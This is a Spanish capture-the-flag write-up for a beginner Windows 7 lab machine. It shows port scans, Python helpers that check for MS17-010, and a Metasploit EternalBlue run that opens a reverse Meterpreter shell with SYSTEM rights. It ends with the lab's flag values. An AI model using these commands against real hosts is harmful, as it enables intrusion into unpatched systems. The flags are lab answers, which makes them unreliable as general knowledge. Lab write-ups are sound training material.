---
icon: flag
---

# Microchoft (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 16:49 EDT
Nmap scan report for 192.168.1.143
Host is up (0.00022s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:01:46:DF (Oracle VirtualBox virtual NIC)
Service Info: Host: MICROCHOFT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Microchoft
|   NetBIOS computer name: MICROCHOFT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-18T21:50:19+01:00
|_clock-skew: mean: -20m01s, deviation: 34m38s, median: -1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MICROCHOFT, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:01:46:df (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-03-18T20:50:19
|_  start_date: 2025-03-18T20:41:46
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.99 seconds
```

Vemos que hay varios puertos abiertos, antes de nada, vamos a identificar que version de sistema operativo es este `Windows`.

Vamos a utilizar un script que me he montado para detectarlo de la siguiente forma:

> detectOS\_version.py

```python
import subprocess
import re
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import print

def get_ttl(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", ip], capture_output=True, text=True)
        ttl_match = re.search(r'ttl=(\d+)', result.stdout, re.IGNORECASE)
        if ttl_match:
            return int(ttl_match.group(1))
    except Exception as e:
        print(f"[bold red]Error ejecutando ping:[/bold red] {e}")
    return None

def detect_os(ttl):
    if ttl is None:
        return "Desconocido"
    elif ttl <= 64:
        return "Linux"
    elif ttl >= 100:
        return "Windows"
    else:
        return "Desconocido"

def extract_windows_versions(nmap_output):
    cpe_matches = re.findall(r'cpe:/o:microsoft:(windows_[\w\d]+|windows_server_\d+)', nmap_output)
    return ", ".join(set(cpe_matches)) if cpe_matches else "No detectado"

def scan_windows_version(ip):
    print("\n[bold cyan]Ejecutando escaneo de versión de Windows con Nmap...[/bold cyan]")
    try:
        result = subprocess.run(["nmap", "-O", "-sV", "--script", "smb-os-discovery", ip], capture_output=True, text=True)
        return extract_windows_versions(result.stdout)
    except Exception as e:
        print(f"[bold red]Error ejecutando Nmap:[/bold red] {e}")
        return "Error"

def scan_linux_version(ip):
    print("\n[bold cyan]Ejecutando escaneo de versión de Linux con Nmap...[/bold cyan]")
    try:
        result = subprocess.run(["nmap", "-O", "-sV", "--script", "ssh-hostkey", ip], capture_output=True, text=True)
        version_match = re.search(r'OS details: (.+)', result.stdout)
        return version_match.group(1) if version_match else "No detectado"
    except Exception as e:
        print(f"[bold red]Error ejecutando Nmap:[/bold red] {e}")
        return "Error"

def main():
    console = Console()
    ip = console.input("[bold yellow]Introduce la IP a escanear: [/bold yellow]")
    
    console.print(Panel(f"[bold cyan]Escaneando IP: [bold white]{ip}[/bold white][/bold cyan]", title="[bold green]OS Detector[/bold green]", expand=False))
    
    ttl = get_ttl(ip)
    os_detected = detect_os(ttl)
    
    table = Table(title="Resultado de Detección de SO", show_lines=True)
    table.add_column("IP", style="bold magenta")
    table.add_column("TTL", style="bold blue")
    table.add_column("Sistema Operativo", style="bold green")
    table.add_row(ip, str(ttl) if ttl else "Desconocido", os_detected)
    console.print(table)
    
    if os_detected == "Windows":
        version = scan_windows_version(ip)
        console.print(Panel(f"[bold yellow]Versiones detectadas:[/bold yellow] {version}", title="[bold red]Detalles de Windows[/bold red]", expand=False))
    elif os_detected == "Linux":
        version = scan_linux_version(ip)
        console.print(Panel(f"[bold yellow]Versión detectada:[/bold yellow] {version}", title="[bold green]Detalles de Linux[/bold green]", expand=False))
    else:
        print("[bold red]No se pudo determinar el sistema operativo o su versión.[/bold red]")
    
if __name__ == "__main__":
    main()
```

Lo ejecutaremos de la siguiente forma:

```shell
python3 detectOS_version.py
```

Info:

```
Introduce la IP a escanear: <IP>
╭──────── OS Detector ─────────╮
│ Escaneando IP: <IP>          │
╰──────────────────────────────╯
       Resultado de Detección de SO
┏━━━━━━━━━━━━━━━┳━━━━━┳━━━━━━━━━━━━━━━━━━━┓
┃ IP            ┃ TTL ┃ Sistema Operativo ┃
┡━━━━━━━━━━━━━━━╇━━━━━╇━━━━━━━━━━━━━━━━━━━┩
│ <IP>          │ 128 │ Windows           │
└───────────────┴─────┴───────────────────┘

Ejecutando escaneo de versión de Windows con Nmap...
╭────────────────────── Detalles de Windows ───────────────────────╮
│ Versiones detectadas: windows_7, windows_server_2008, windows_8  │
╰──────────────────────────────────────────────────────────────────╯
```

Vemos que puede ser una de esas versiones de `Windows`, pero al desplegar la maquina vi que era `Windows 7` y encima estamos viendo que tiene el `SMB`.

Igualmente tirando este `nmap`:

```shell
nmap -O -sV --script=smb-os-discovery <IP>
```

Podemos saber que es un `Windows 7 Home Basic` de forma detallada.

Podemos deducir que puede tener el `SMBv1` ya que es `Windows 7` y era muy comun en ese tipo de versiones, vamos a comprobarlo con un `script` de `nmap`.

```shell
nmap -p 445 --script smb-vuln-ms17-010 <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 16:54 EDT
Nmap scan report for 192.168.1.143
Host is up (0.00037s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:01:46:DF (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

O podemos utilizar un `script` en `python3` para que nos lo diga de forma mas rapida:

> eternalDetect.py

```python
import subprocess
import re
from rich.console import Console
from rich.panel import Panel

def check_smbv1_vulnerability(ip):
    console = Console()
    console.print(Panel(f"Escaneando [bold yellow]{ip}[/bold yellow] en busca de vulnerabilidad SMBv1 (EternalBlue)...", title="[bold red]SMB Vulnerability Scan[/bold red]", expand=False))

    try:
        result = subprocess.run(["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", ip], capture_output=True, text=True)

        if "VULNERABLE" in result.stdout:
            console.print(Panel("[bold red]¡El sistema es vulnerable a EternalBlue![/bold red] ⚠", title="[bold red]Vulnerabilidad Detectada[/bold red]", expand=False))
        else:
            console.print(Panel("[bold green]El sistema NO es vulnerable a EternalBlue.[/bold green] ✅", title="[bold green]Seguro[/bold green]", expand=False))

    except Exception as e:
        console.print(f"[bold red]Error al ejecutar el escaneo:[/bold red] {e}")

if __name__ == "__main__":
    console = Console()
    ip = console.input("[bold yellow]Introduce la IP a escanear: [/bold yellow]")
    check_smbv1_vulnerability(ip)
```

Lo ejecutaremos de la siguiente forma:

```
python3 eternalDetect.py
```

Info:

```
Introduce la IP a escanear: <IP>
╭────────────────────────── SMB Vulnerability Scan ──────────────────────────╮
│ Escaneando <IP> en busca de vulnerabilidad SMBv1 (EternalBlue)...          │
╰────────────────────────────────────────────────────────────────────────────╯
╭───────── Vulnerabilidad Detectada ─────────╮
│ ¡El sistema es vulnerable a EternalBlue! ⚠ │
╰────────────────────────────────────────────╯
```

Vemos que si es vulnerable, por lo que nos iremos a `metasploit` para ejecutar el `exploit` desde ahi.

## Metasploit (EternalBlue)

Abriremos la consola de `metasploit`.

```shell
msfconsole -q
```

Seleccionaremos el `exploit` poniendo lo siguiente:

```shell
use exploit/windows/smb/ms17_010_eternalblue
```

Ahora tendremos que configurarlo de la siguiente forma:

```shell
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.1.146:4444 
[*] 192.168.1.143:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.143:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.143:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.143:445 - The target is vulnerable.
[*] 192.168.1.143:445 - Connecting to target for exploitation.
[+] 192.168.1.143:445 - Connection established for exploitation.
[+] 192.168.1.143:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.143:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.1.143:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 192.168.1.143:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
[*] 192.168.1.143:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.1.143:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.143:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.143:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.143:445 - Starting non-paged pool grooming
[+] 192.168.1.143:445 - Sending SMBv2 buffers
[+] 192.168.1.143:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.143:445 - Sending final SMBv2 buffers.
[*] 192.168.1.143:445 - Sending last fragment of exploit packet!
[*] 192.168.1.143:445 - Receiving response from exploit packet
[+] 192.168.1.143:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.143:445 - Sending egg to corrupted connection.
[*] 192.168.1.143:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.1.143
[*] Meterpreter session 1 opened (192.168.1.146:4444 -> 192.168.1.143:49160) at 2025-03-18 16:59:01 -0400
[+] 192.168.1.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Por lo que vemos seremos `administradores` directamente, por lo que habremos terminado la maquina, ahora leeremos las `flags` del `usuario` y `administrador`.

> user.txt

```
13e624146d31ea232c850267c2745caa
```

> admin.txt

```
ff4ad2daf333183677e02bf8f67d4dca
```
